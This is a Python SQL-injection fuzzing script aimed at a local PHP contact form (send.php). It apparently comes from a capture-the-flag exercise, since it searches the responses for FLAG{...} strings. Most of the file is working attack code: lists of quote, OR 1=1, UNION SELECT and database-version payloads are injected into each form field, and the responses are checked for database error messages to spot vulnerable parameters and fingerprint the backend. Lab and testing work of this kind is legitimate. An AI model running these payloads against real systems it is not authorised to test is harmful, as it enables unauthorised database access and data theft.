import requests
import urllib.parse
import json
import re

# Target URL
BASE_URL = "http://127.0.0.1:32826"
SEND_URL = f"{BASE_URL}/send.php"

# Create a session
session = requests.Session()

# Baseline data (normal form submission)
baseline_data = {
    'fullname': 'John Doe',
    'email': 'john@example.com',
    'phone': '1234567890',
    'subject': 'Test Subject',
    'message': 'This is a normal test message'
}

# Payload categories
payloads = {
    'quote_tests': [
        {"name": "Single quote", "payload": "'"},
        {"name": "Double quote", "payload": '"'},
        {"name": "Backslash single quote", "payload": "\\'"},
        {"name": "Two single quotes", "payload": "''"},
        {"name": "Single quote space", "payload": "' "},
    ],
    'error_based': [
        {"name": "OR 1=1 comment", "payload": "' OR 1=1--"},
        {"name": "OR 1=1 space comment", "payload": "' OR 1=1 --"},
        {"name": "OR '1'='1' comment", "payload": "' OR '1'='1'--"},
        {"name": "Quote OR 1=1", "payload": "\" OR 1=1--"},
        {"name": "OR 1=1 hash", "payload": "' OR 1=1#"},
    ],
    'union_tests': [
        {"name": "UNION SELECT 1", "payload": "' UNION SELECT 1--"},
        {"name": "UNION SELECT 1,2", "payload": "' UNION SELECT 1,2--"},
        {"name": "UNION SELECT 1,2,3", "payload": "' UNION SELECT 1,2,3--"},
        {"name": "UNION SELECT 1,2,3,4", "payload": "' UNION SELECT 1,2,3,4--"},
        {"name": "UNION SELECT 1,2,3,4,5", "payload": "' UNION SELECT 1,2,3,4,5--"},
        {"name": "UNION SELECT null", "payload": "' UNION SELECT null--"},
        {"name": "UNION SELECT null,null", "payload": "' UNION SELECT null,null--"},
        {"name": "UNION SELECT null,null,null", "payload": "' UNION SELECT null,null,null--"},
    ],
    'db_fingerprinting': [
        {"name": "MySQL version", "payload": "' UNION SELECT @@version--"},
        {"name": "PostgreSQL version", "payload": "' UNION SELECT version()--"},
        {"name": "SQLite version", "payload": "' UNION SELECT sqlite_version()--"},
        {"name": "MySQL user", "payload": "' UNION SELECT user()--"},
        {"name": "PostgreSQL user", "payload": "' UNION SELECT current_user--"},
        {"name": "MySQL database", "payload": "' UNION SELECT database()--"},
        {"name": "MySQL 1=1", "payload": "' UNION SELECT 1 from dual where 1=1--"},
    ],
    'string_concat': [
        {"name": "String concat 1", "payload": "' OR 'a'='a'--"},
        {"name": "String concat 2", "payload": "' OR 'a'='a"},
        {"name": "String concat 3", "payload": "\" OR \"a\"=\"a\"--"},
        {"name": "And false", "payload": "' AND 1=2--"},
    ]
}

# Store results
results = {}

print("=" * 80)
print("SQL INJECTION TESTING - send.php")
print("=" * 80)

# First, get baseline response
print(f"\n[BASELINE] Sending normal form data...")
try:
    baseline_response = session.post(SEND_URL, data=baseline_data)
    baseline_status = baseline_response.status_code
    baseline_content = baseline_response.text
    baseline_headers = dict(baseline_response.headers)
    baseline_length = len(baseline_content)
    
    print(f"[BASELINE] Status: {baseline_status} | Length: {baseline_length}B")
    print(f"[BASELINE] Headers: {json.dumps(baseline_headers, indent=2)}")
    print(f"[BASELINE] Content preview: {baseline_content[:200]}...")
    
except Exception as e:
    print(f"[ERROR] Baseline request failed: {e}")
    baseline_status = None
    baseline_content = ""
    baseline_length = 0

# Test each parameter
parameters = ['fullname', 'email', 'phone', 'subject', 'message']

for param in parameters:
    print(f"\n{'=' * 80}")
    print(f"TESTING PARAMETER: {param}")
    print(f"{'=' * 80}")
    
    results[param] = {}
    
    for category, category_payloads in payloads.items():
        print(f"\n[+] Testing {category} payloads...")
        results[param][category] = []
        
        for test_payload in category_payloads:
            test_data = baseline_data.copy()
            test_data[param] = test_payload['payload']
            
            try:
                response = session.post(SEND_URL, data=test_data)
                status = response.status_code
                content = response.text
                headers = dict(response.headers)
                length = len(content)
                
                # Check for differences from baseline
                differences = []
                if baseline_status and status != baseline_status:
                    differences.append(f"Status changed: {baseline_status} → {status}")
                if baseline_length and length != baseline_length:
                    differences.append(f"Length changed: {baseline_length}B → {length}B")
                
                # Look for error patterns
                error_indicators = [
                    "sql", "SQL", "mysql", "MySQL", "postgresql", "PostgreSQL",
                    "sqlite", "SQLite", "syntax", "Syntax", "error", "Error",
                    "ORA-", "ORA-", "warning", "Warning", "uncaught", "exception",
                    "division by zero", "constraint", "duplicate", "unknown column",
                    "unclosed", "quotation", "unexpected", "parse", "invalid"
                ]
                
                found_errors = []
                for indicator in error_indicators:
                    if indicator.lower() in content.lower():
                        found_errors.append(indicator)
                
                # Store result
                result = {
                    'payload_name': test_payload['name'],
                    'payload': test_payload['payload'],
                    'status': status,
                    'length': length,
                    'differences': differences,
                    'errors': found_errors,
                    'has_errors': len(found_errors) > 0,
                    'content_preview': content[:300]
                }
                
                results[param][category].append(result)
                
                # Print concise output
                status_indicator = "[!]" if differences or found_errors else "[+]"
                print(f"{status_indicator} {test_payload['name']}: Status={status}, Length={length}B")
                
                if differences:
                    print(f"  Differences: {', '.join(differences)}")
                if found_errors:
                    print(f"  Errors found: {', '.join(found_errors[:3])}")
                    if len(found_errors) > 3:
                        print(f"  ... and {len(found_errors) - 3} more")
                
                # If we got interesting results, show more content
                if differences or found_errors:
                    print(f"  Content: {content[:400]}...")
                
            except Exception as e:
                print(f"[ERROR] Request failed for {test_payload['name']}: {e}")

print(f"\n{'=' * 80}")
print("COMPREHENSIVE ANALYSIS")
print(f"{'=' * 80}")

# Analyze results
vulnerable_params = []
db_indicators = []
union_successes = {}

for param in parameters:
    param_results = results[param]
    param_vulnerable = False
    
    print(f"\n[ANALYSIS] Parameter: {param}")
    
    # Check quote tests for syntax errors
    if 'quote_tests' in param_results:
        syntax_errors = 0
        for result in param_results['quote_tests']:
            if result['has_errors'] or result['differences']:
                syntax_errors += 1
        
        if syntax_errors > 0:
            print(f"  [VULNERABILITY] Quote tests triggered {syntax_errors} anomalies")
            param_vulnerable = True
        else:
            print(f"  [INFO] Quote tests: No anomalies detected")
    
    # Check error-based tests
    if 'error_based' in param_results:
        error_count = 0
        for result in param_results['error_based']:
            if result['has_errors'] or result['differences']:
                error_count += 1
        
        if error_count > 0:
            print(f"  [VULNERABILITY] Error-based tests triggered {error_count} anomalies")
            param_vulnerable = True
    
    # Check UNION tests for column discovery
    if 'union_tests' in param_results:
        successful_unions = []
        for result in param_results['union_tests']:
            if result['has_errors']:
                # Check for column count errors
                content_lower = result['content_preview'].lower()
                if 'column' in content_lower or 'field' in content_lower or 'count' in content_lower:
                    print(f"  [INFO] UNION {result['payload_name']} - column mismatch: {result['errors'][:2]}")
                else:
                    print(f"  [INFO] UNION {result['payload_name']} - errors: {result['errors'][:2]}")
            elif result['differences']:
                # Different response but no SQL errors - might be working
                successful_unions.append(result['payload_name'])
        
        if successful_unions:
            print(f"  [POTENTIAL] UNION tests with different responses: {successful_unions}")
            union_successes[param] = successful_unions
            param_vulnerable = True
    
    # Check database fingerprinting
    if 'db_fingerprinting' in param_results:
        db_matches = []
        for result in param_results['db_fingerprinting']:
            if not result['has_errors'] and not result['differences']:
                # Might indicate the query worked
                content_lower = result['content_preview'].lower()
                if '@@version' in result['payload']:
                    if 'version' in content_lower or '5.' in content_lower or '8.' in content_lower:
                        db_matches.append('MySQL (@@version)')
                elif 'version()' in result['payload']:
                    if 'postgresql' in content_lower or 'postgres' in content_lower:
                        db_matches.append('PostgreSQL (version())')
                    elif 'sqlite' in content_lower:
                        db_matches.append('SQLite (version())')
                elif 'sqlite_version()' in result['payload']:
                    if 'sqlite' in content_lower or '3.' in content_lower:
                        db_matches.append('SQLite (sqlite_version())')
        
        if db_matches:
            db_indicators.extend(db_matches)
            print(f"  [DATABASE] Possible matches: {db_matches}")
    
    # Check for specific error messages
    all_test_results = []
    for category_results in param_results.values():
        all_test_results.extend(category_results)
    
    mysql_errors = []
    pg_errors = []
    sqlite_errors = []
    mssql_errors = []
    oracle_errors = []
    
    for result in all_test_results:
        if result['has_errors']:
            content_lower = result['content_preview'].lower()
            if 'mysql' in content_lower:
                mysql_errors.append(result['errors'])
            if 'postgresql' in content_lower or 'postgres' in content_lower:
                pg_errors.append(result['errors'])
            if 'sqlite' in content_lower:
                sqlite_errors.append(result['errors'])
            if 'mssql' in content_lower or 'sql server' in content_lower:
                mssql_errors.append(result['errors'])
            if 'ora-' in content_lower:
                oracle_errors.append(result['errors'])
    
    if mysql_errors:
        print(f"  [DATABASE] MySQL errors detected in {len(mysql_errors)} tests")
        db_indicators.append('MySQL')
    if pg_errors:
        print(f"  [DATABASE] PostgreSQL errors detected in {len(pg_errors)} tests")
        db_indicators.append('PostgreSQL')
    if sqlite_errors:
        print(f"  [DATABASE] SQLite errors detected in {len(sqlite_errors)} tests")
        db_indicators.append('SQLite')
    if mssql_errors:
        print(f"  [DATABASE] MSSQL errors detected in {len(mssql_errors)} tests")
        db_indicators.append('MSSQL')
    if oracle_errors:
        print(f"  [DATABASE] Oracle errors detected in {len(oracle_errors)} tests")
        db_indicators.append('Oracle')
    
    if param_vulnerable:
        vulnerable_params.append(param)

# Final summary
print(f"\n{'=' * 80}")
print("FINAL SUMMARY")
print(f"{'=' * 80}")

print(f"\n[SUMMARY] Vulnerable parameters: {vulnerable_params if vulnerable_params else 'None detected'}")

if db_indicators:
    unique_dbs = list(set(db_indicators))
    print(f"[SUMMARY] Database indicators: {unique_dbs}")
    # Count occurrences
    db_counts = {}
    for db in unique_dbs:
        db_counts[db] = db_indicators.count(db)
    most_likely = max(db_counts, key=db_counts.get)
    print(f"[SUMMARY] Most likely database: {most_likely} (detected in {db_counts[most_likely]} contexts)")
else:
    print(f"[SUMMARY] Database indicators: None detected")

if union_successes:
    print(f"\n[SUMMARY] UNION test results:")
    for param, unions in union_successes.items():
        print(f"  {param}: {unions}")
        # Analyze column count from successful UNIONs
        for union_name in unions:
            if 'SELECT 1,' in union_name:
                # Extract column count
                match = re.search(r'SELECT 1(?:,\d+)*', union_name)
                if match:
                    cols = match.group(0).count(',') + 1
                    print(f"    → Possibly {cols} columns in query")

# Check for any flags in responses
print(f"\n{'=' * 80}")
print("FLAG SEARCH")
print(f"{'=' * 80}")

flag_pattern = r'FLAG\{[^}]+\}'
all_content = ""

for param in parameters:
    for category, category_results in results[param].items():
        for result in category_results:
            all_content += result['content_preview']

import re
flags = re.findall(flag_pattern, all_content)
if flags:
    print(f"[+] FLAGS FOUND: {flags}")
    for flag in flags:
        print(f"  → {flag}")
else:
    print("[-] No flags found in responses")

print(f"\n{'=' * 80}")
print("TEST COMPLETE")
